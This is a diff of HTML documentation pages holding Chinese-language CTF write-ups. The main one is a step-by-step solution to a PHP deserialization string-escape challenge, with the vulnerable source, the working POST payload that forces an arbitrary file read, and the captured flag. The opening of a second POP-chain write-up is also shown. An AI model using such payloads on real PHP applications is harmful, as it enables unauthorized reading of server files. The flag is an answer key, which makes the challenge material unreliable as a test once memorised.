+</span><span id="__span-57-9"><a id="__codelineno-57-9" name="__codelineno-57-9" href="#__codelineno-57-9"></a><span class="x">extract($_POST);</span>
+</span><span id="__span-57-10"><a id="__codelineno-57-10" name="__codelineno-57-10" href="#__codelineno-57-10"></a>
+</span><span id="__span-57-11"><a id="__codelineno-57-11" name="__codelineno-57-11" href="#__codelineno-57-11"></a><span class="x">if(!$_GET['img_path']){</span>
+</span><span id="__span-57-12"><a id="__codelineno-57-12" name="__codelineno-57-12" href="#__codelineno-57-12"></a><span class="x">    $_SESSION['img'] = base64_encode('guest_img.png');</span>
+</span><span id="__span-57-13"><a id="__codelineno-57-13" name="__codelineno-57-13" href="#__codelineno-57-13"></a><span class="x">}else{</span>
+</span><span id="__span-57-14"><a id="__codelineno-57-14" name="__codelineno-57-14" href="#__codelineno-57-14"></a><span class="x">    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));</span>
+</span><span id="__span-57-15"><a id="__codelineno-57-15" name="__codelineno-57-15" href="#__codelineno-57-15"></a><span class="x">}</span>
+</span><span id="__span-57-16"><a id="__codelineno-57-16" name="__codelineno-57-16" href="#__codelineno-57-16"></a>
+</span><span id="__span-57-17"><a id="__codelineno-57-17" name="__codelineno-57-17" href="#__codelineno-57-17"></a><span class="x">$serialize_info = filter(serialize($_SESSION));</span>
+</span><span id="__span-57-18"><a id="__codelineno-57-18" name="__codelineno-57-18" href="#__codelineno-57-18"></a>
+</span><span id="__span-57-19"><a id="__codelineno-57-19" name="__codelineno-57-19" href="#__codelineno-57-19"></a><span class="x">if($function == 'highlight_file'){</span>
+</span><span id="__span-57-20"><a id="__codelineno-57-20" name="__codelineno-57-20" href="#__codelineno-57-20"></a><span class="x">    highlight_file('index.php');</span>
+</span><span id="__span-57-21"><a id="__codelineno-57-21" name="__codelineno-57-21" href="#__codelineno-57-21"></a><span class="x">}else if($function == 'phpinfo'){</span>
+</span><span id="__span-57-22"><a id="__codelineno-57-22" name="__codelineno-57-22" href="#__codelineno-57-22"></a><span class="x">    eval('phpinfo();');</span>
+</span><span id="__span-57-23"><a id="__codelineno-57-23" name="__codelineno-57-23" href="#__codelineno-57-23"></a><span class="x">}else if($function == 'show_image'){</span>
+</span><span id="__span-57-24"><a id="__codelineno-57-24" name="__codelineno-57-24" href="#__codelineno-57-24"></a><span class="x">    $userinfo = unserialize($serialize_info);</span>
+</span><span id="__span-57-25"><a id="__codelineno-57-25" name="__codelineno-57-25" href="#__codelineno-57-25"></a><span class="x">    echo file_get_contents(base64_decode($userinfo['img']));</span>
+</span><span id="__span-57-26"><a id="__codelineno-57-26" name="__codelineno-57-26" href="#__codelineno-57-26"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>能读文件的是 <code>show_image</code> 分支：</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="x">$userinfo = unserialize($serialize_info);</span>
-</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="x">echo file_get_contents(base64_decode($userinfo['img']));</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="x">$userinfo = unserialize($serialize_info);</span>
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="x">echo file_get_contents(base64_decode($userinfo['img']));</span>
 </span></code></pre></div>
 <p><strong>所以目标是：让 <code>$userinfo['img']</code> 等于</strong>某个文件路径的 base64<strong>。</strong></p>
 <h4 id="step-2-img"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-2-img">Step 2：为什么不能直接改 img</a></h4>
 <p><strong><code>$_SESSION['img']</code> 在两个分支里都被无条件赋值，而且是在 <code>extract($_POST)</code> <strong>之后</strong>：</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="x">if(!$_GET['img_path']){</span>
-</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="x">    $_SESSION['img'] = base64_encode('guest_img.png');</span>
-</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="x">}else{</span>
-</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="x">    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));</span>
-</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="x">if(!$_GET['img_path']){</span>
+</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a><span class="x">    $_SESSION['img'] = base64_encode('guest_img.png');</span>
+</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a><span class="x">}else{</span>
+</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a><span class="x">    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));</span>
+</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>所以你 POST 里传的 <code>img</code> 会被覆盖掉；<code>sha1()</code> 的输出又永远是 40 位十六进制，</strong>注入不进去任何结构<strong>。</strong></p>
 <p><strong>这条路封死。真正的入口是 <code>filter()</code>——它会把序列化串里的 <code>php</code>、<code>flag</code> 删掉。</strong></p>
 <h4 id="step-3"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-3">Step 3：错位从这里开始</a></h4>
 <p><strong><code>serialize()</code> 里的长度声明是</strong>按过滤前的内容算<strong>的，但 <code>filter()</code> 之后内容变短了：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>序列化：s:7:"phpflag";     ← 声明读 7 个字节
-</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>过滤后：s:7:"";            ← 内容被删光，0 个字节
+<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>序列化：s:7:"phpflag";     ← 声明读 7 个字节
+</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>过滤后：s:7:"";            ← 内容被删光，0 个字节
 </span></code></pre></div>
 <p><strong>解析器不会报错，它按规则</strong>从引号后面数 7 个字节<strong>——数到的是后面那段内容。</strong></p>
 <p><strong>这就是“逃逸”：长度声明和实际内容不匹配，解析器多读的那部分，变成了下一个结构。</strong></p>
 <h4 id="step-4-payload"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-4-payload">Step 4：我把 payload 放错了位置（三次错）</a></h4>
 <p><strong>① 填充放在</strong>值<strong>里——废</strong></p>
 <p><strong>我把 <code>php</code> 重复十几次塞进 <code>user</code> 的值里，想让 filter 删掉它们。</strong>结果：**</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>过滤前: s:4:"user";s:89:"guestphpphp…php";}s:3:"img";…"
-</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>过滤后: s:4:"user";s:89:"guest";}s:3:"img";…"
-</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>                     └ 声明 89，实际只剩 47 ┘
+<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>过滤前: s:4:"user";s:89:"guestphpphp…php";}s:3:"img";…"
+</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>过滤后: s:4:"user";s:89:"guest";}s:3:"img";…"
+</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a>                     └ 声明 89，实际只剩 47 ┘
 </span></code></pre></div>
 <p><strong>解析器从 <code>guest</code> 往后数 89 个字节，把我写的 <code>";}s:3:"img";...</code> <strong>全算进了 user 的值里</strong>——我写的结构一次都没被当成结构，只是被当成字符。<code>unserialize</code> 返回 <code>false</code>。</strong></p>
 <p><strong>② 填充放在</strong>键名<strong>里——对</strong></p>
 <p><strong>键名的写法也是 <code>s:N:"键名"</code>，同样有长度声明，同样会被删：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>过滤前: s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBn…";}"
-</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>过滤后: s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBn…";}"
+<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>过滤前: s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBn…";}"
+</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>过滤后: s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBn…";}"
 </span></code></pre></div>
 <p><strong>这次断的是</strong>键名和值的交界处<strong>，值本身是完整的。解析器从值里借 7 个字节当键名，剩下的部分就变成了</strong>新的结构<strong>。</strong></p>
 <p><strong>③ 还手写过整条序列化串——那也是错的</strong></p>
 <p><strong>这题</strong>不需要你写序列化串<strong>。<code>serialize($_SESSION)</code> 是服务器自己做的。我一开始写成这样：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>O:7:"Session":3:{s:4:"user";…}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>O:7:"Session":3:{s:4:"user";…}
 </span></code></pre></div>
 <p><strong>两个问题：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>O: 是对象格式，$_SESSION 是数组，应该是 a:
-</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>没有 Session 这个类 → 变成 __PHP_Incomplete_Class → 后面不能当数组用
+<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>O: 是对象格式，$_SESSION 是数组，应该是 a:
+</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>没有 Session 这个类 → 变成 __PHP_Incomplete_Class → 后面不能当数组用
 </span></code></pre></div>
 <p><strong>你的 payload 只是 POST 里的</strong>一个字符串值<strong>。</strong></p>
 <h4 id="step-5"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-5">Step 5：参数名也写错了</a></h4>
 <p><strong>我写的是 <code>$_SESSION['flag']=...</code>——这是 PHP 语法，不是 HTTP 参数名。</strong></p>
 <p><strong>HTTP 里要写：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>_SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>_SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
 </span></code></pre></div>
 <p><strong>注意这里没有 <code>$</code>、没有单引号。</strong></p>
 <h4 id="step-6-2"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-6-2">Step 6：一个意外发现——数组只剩 2 个元素</a></h4>
 <p><strong><code>extract($_POST)</code> 把 <code>_POST['_SESSION']</code> 这个</strong>数组<strong>整体赋给了 <code>$_SESSION</code>，</strong>不是往里面加键，而是整个替换掉<strong>。</strong></p>
 <p><strong>所以服务器真正的序列化串是：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>a:2:{s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>a:2:{s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
 </span></code></pre></div>
 <p><strong>只有 2 个元素：我的键 + img。<code>user</code> 和 <code>function</code> 已经不存在了。</strong></p>
 <p><strong>这也解释了那个 <code>;s:1:"1";</code> 是干什么的——占一个元素的位置，让解析出来的元素数正好等于 <code>a:2:</code> 声明的 2 个。</strong></p>
 <h4 id="step-7"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-7">Step 7：逐字节看解析过程</a></h4>
 <p><strong>过滤后的串：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>a:2:{s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>a:2:{s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
 </span></code></pre></div>
 <p><strong>解析器这样走：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>① a:2:{                    → 要读 2 组键值对
-</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>② 读第 1 组的键:  s:7  →  从引号后数 7 个字节 = '";s:48:'
-</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>③ 读第 1 组的值:  s:1  →  读 1 个字节 = '1'
-</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a>④ 读第 2 组的键:  s:3  →  'img'
-</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a>⑤ 读第 2 组的值:  s:20 →  'ZDBnM19mMWFnLnBocA=='
-</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a>⑥ 读到 '}'，结束。后面那段"真正的 img"被丢弃
+<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>① a:2:{                    → 要读 2 组键值对
+</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>② 读第 1 组的键:  s:7  →  从引号后数 7 个字节 = '";s:48:'
+</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a>③ 读第 1 组的值:  s:1  →  读 1 个字节 = '1'
+</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a>④ 读第 2 组的键:  s:3  →  'img'
+</span><span id="__span-68-5"><a id="__codelineno-68-5" name="__codelineno-68-5" href="#__codelineno-68-5"></a>⑤ 读第 2 组的值:  s:20 →  'ZDBnM19mMWFnLnBocA=='
+</span><span id="__span-68-6"><a id="__codelineno-68-6" name="__codelineno-68-6" href="#__codelineno-68-6"></a>⑥ 读到 '}'，结束。后面那段"真正的 img"被丢弃
 </span></code></pre></div>
 <p><strong>最终：<code>$userinfo['img'] = 'ZDBnM19mMWFnLnBocA=='</code>。</strong></p>
 <p><strong>第一步最关键：<code>phpflag</code> 被删光，但 <code>s:7</code> 的声明还在，解析器不会“觉得不对”，它只是从下一个字节开始数 7 个。</strong></p>
 <h4 id="step-8"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-8">Step 8：读文件</a></h4>
 <p><strong><code>ZDBnM19mMWFnLnBocA==</code> 解出来是 <code>d0g3_f1ag.php</code>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>file_get_contents(base64_decode('ZDBnM19mMWFnLnBocA=='))
-</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>→ &lt;?php $flag = 'flag in /d0g3_fllllllag'; ?&gt;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>file_get_contents(base64_decode('ZDBnM19mMWFnLnBocA=='))
+</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>→ &lt;?php $flag = 'flag in /d0g3_fllllllag'; ?&gt;
 </span></code></pre></div>
 <p><strong>真正的 flag 在 <code>/d0g3_fllllllag</code>，重新算 base64：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>/d0g3_fllllllag  →  L2QwZzNfZmxsbGxsbGFn
+<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>/d0g3_fllllllag  →  L2QwZzNfZmxsbGxsbGFn
 </span></code></pre></div>
 <p><strong>再发一次：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
-</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>GET  ?f=show_image
+<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
+</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>GET  ?f=show_image
 </span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>CTF2{dad89ab0-9990-4063-bc5a-fabbcc9cb29e}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>CTF2{dad89ab0-9990-4063-bc5a-fabbcc9cb29e}
 </span></code></pre></div>
 <hr />
 <h3 id="_3"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>读源码 → sink 在 show_image：unserialize + base64_decode + file_get_contents
-</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>       → img 被代码无条件覆盖，注入不进去
-</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>         → 突破口：filter 会删 php/flag，让长度声明和内容不匹配
-</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a>           → 填充放在"值"里 → 解析器把后面的结构一起吞掉（失败）
-</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a>             → 填充放在"键名"里 → 断点落在键名/值交界，落点可控（成功）
-</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a>               → 补一个假元素 ;s:1:"1"; 让元素数对上 a:2
-</span><span id="__span-54-7"><a id="__codelineno-54-7" name="__codelineno-54-7" href="#__codelineno-54-7"></a>                 → 读出 d0g3_f1ag.php → 里面写着真实路径 → 再来一次
+<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>读源码 → sink 在 show_image：unserialize + base64_decode + file_get_contents
+</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a>       → img 被代码无条件覆盖，注入不进去
+</span><span id="__span-73-3"><a id="__codelineno-73-3" name="__codelineno-73-3" href="#__codelineno-73-3"></a>         → 突破口：filter 会删 php/flag，让长度声明和内容不匹配
+</span><span id="__span-73-4"><a id="__codelineno-73-4" name="__codelineno-73-4" href="#__codelineno-73-4"></a>           → 填充放在"值"里 → 解析器把后面的结构一起吞掉（失败）
+</span><span id="__span-73-5"><a id="__codelineno-73-5" name="__codelineno-73-5" href="#__codelineno-73-5"></a>             → 填充放在"键名"里 → 断点落在键名/值交界，落点可控（成功）
+</span><span id="__span-73-6"><a id="__codelineno-73-6" name="__codelineno-73-6" href="#__codelineno-73-6"></a>               → 补一个假元素 ;s:1:"1"; 让元素数对上 a:2
+</span><span id="__span-73-7"><a id="__codelineno-73-7" name="__codelineno-73-7" href="#__codelineno-73-7"></a>                 → 读出 d0g3_f1ag.php → 里面写着真实路径 → 再来一次
 </span></code></pre></div>
 <h4 id="_4"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#_4">漏洞原理</a></h4>
 <p><strong>① 长度声明是“过滤前”算的</strong></p>
 <p><strong><code>serialize()</code> 生成的 <code>s:N:"..."</code> 是按当时内容的长度算的；<code>filter()</code> 改了内容，<code>N</code> 却不会变。</strong></p>
 <p><strong>解析器只认 <code>N</code>：它从引号后精确数 <code>N</code> 个字节。</strong>内容短了，它就多读到后面的东西——<strong>多读的部分被当成新结构。</strong></p>
 <p><strong>② 错位点在哪，决定了你能不能控制</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>填充在值里   →  值本身断裂，后面全被当字符吞掉  →  不可控
-</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>填充在键名里 →  值完整，断点落在"键名结束 → 值开始"  →  可控
+<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>填充在值里   →  值本身断裂，后面全被当字符吞掉  →  不可控
+</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a>填充在键名里 →  值完整，断点落在"键名结束 → 值开始"  →  可控
 </span></code></pre></div>
 <p><strong>③ <code>extract()</code> 同名会整体替换</strong></p>
 <p><strong><code>_POST['_SESSION']</code> 是数组，<code>extract</code> 会把它整个赋给 <code>$_SESSION</code>，</strong>不是合并<strong>。</strong>所以 <code>user</code>、<code>function</code> 消失了，数组只剩你的键和 <code>img</code>。**</p>
@@ -3926,13 +3926,13 @@
 <hr />
 <details class="note">
 <summary>完整 payload</summary>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>GET  /index.php?f=show_image
-</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>
-</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
-</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a>→ 返回 d0g3_f1ag.php 的内容：$flag = 'flag in /d0g3_fllllllag';
-</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a>
-</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a>POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
-</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a>→ CTF2{dad89ab0-9990-4063-bc5a-fabbcc9cb29e}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>GET  /index.php?f=show_image
+</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a>
+</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3" href="#__codelineno-75-3"></a>POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
+</span><span id="__span-75-4"><a id="__codelineno-75-4" name="__codelineno-75-4" href="#__codelineno-75-4"></a>→ 返回 d0g3_f1ag.php 的内容：$flag = 'flag in /d0g3_fllllllag';
+</span><span id="__span-75-5"><a id="__codelineno-75-5" name="__codelineno-75-5" href="#__codelineno-75-5"></a>
+</span><span id="__span-75-6"><a id="__codelineno-75-6" name="__codelineno-75-6" href="#__codelineno-75-6"></a>POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
+</span><span id="__span-75-7"><a id="__codelineno-75-7" name="__codelineno-75-7" href="#__codelineno-75-7"></a>→ CTF2{dad89ab0-9990-4063-bc5a-fabbcc9cb29e}
 </span></code></pre></div>
 </details>
 <details class="note">
@@ -3988,134 +3988,134 @@
 <hr />
 <h3 id="_1"><a class="toclink" href="../../newstarctf-unserializeone/#_1">题目概述</a></h3>
 <p>给一份源码，入口就一句：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="x">if(isset($_POST['pop'])){</span>
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="x">    unserialize($_POST['pop']);</span>
-</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="x">if(isset($_POST['pop'])){</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="x">    unserialize($_POST['pop']);</span>
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>四个类：<code>Start</code>、<code>Sec</code>、<code>Easy</code>、<code>eeee</code>，各带魔术方法。任务是拼一条从 <code>unserialize</code> 走到 <code>file_get_contents('/flag')</code> 的链。</strong></p>
 <hr />
 <h3 id="_2"><a class="toclink" href="../../newstarctf-unserializeone/#_2">解题过程</a></h3>
 <h4 id="step-1flag"><a class="toclink" href="../../newstarctf-unserializeone/#step-1flag">Step 1：先找终点——flag 在哪被读出来</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="x">class Sec{</span>
-</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="x">    public function __invoke()</span>
-</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="x">    {</span>
-</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="x">        echo file_get_contents('/flag');</span>
-</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="x">    }</span>
-</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="x">}</span>
